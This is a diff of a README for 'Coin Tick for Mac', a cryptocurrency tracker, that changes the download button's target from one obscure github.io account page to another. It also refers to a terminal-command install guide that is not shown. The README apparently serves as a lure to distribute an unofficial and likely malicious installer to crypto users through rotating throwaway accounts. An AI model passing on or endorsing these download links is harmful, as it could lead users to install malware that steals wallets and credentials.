@@ -3,7 +3,7 @@
 
 Coin Tick for Mac is a professional cryptocurrency tracking software 📈 that allows users to monitor crypto prices, manage portfolios, and analyze market trends. Follow the instructions below to install Coin Tick on your Mac.
 
-[![Download Coin Tick For Mac](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/cointick)
+[![Download Coin Tick For Mac](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tayusikf8398.github.io/.github/cointick)
 
 If the download button doesn’t work, follow the installation guide below using the terminal command.
 
